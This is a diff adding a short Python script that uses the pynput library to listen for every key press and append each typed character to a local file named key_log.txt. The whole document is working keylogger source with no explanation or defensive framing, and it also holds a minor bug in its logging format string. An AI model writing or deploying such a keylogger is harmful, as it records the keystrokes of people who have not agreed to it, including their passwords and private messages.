@@ -1,0 +1,32 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+
+global filename
+global file
+
+def create_file():
+	global filename
+	global file	
+	filename="key_log.txt"
+	file=open(filename,'a',1)
+
+def on_press(keyObject):
+	global filename
+	global file	
+	try:
+		print(keyObject.char)
+		key=keyObject.char
+		file.write(key)
+	except Exception:
+		file.write(' ')
+	file.flush()
+
+def main():
+	create_file()
+	logging.basicConfig(filename=filename,level=logging.DEBUG,format='%(asctime)s: %(messages)s:')	
+	with Listener(on_press=on_press) as listener:
+		listener.join()
+
+if(__name__=="__main__"):
+	main()
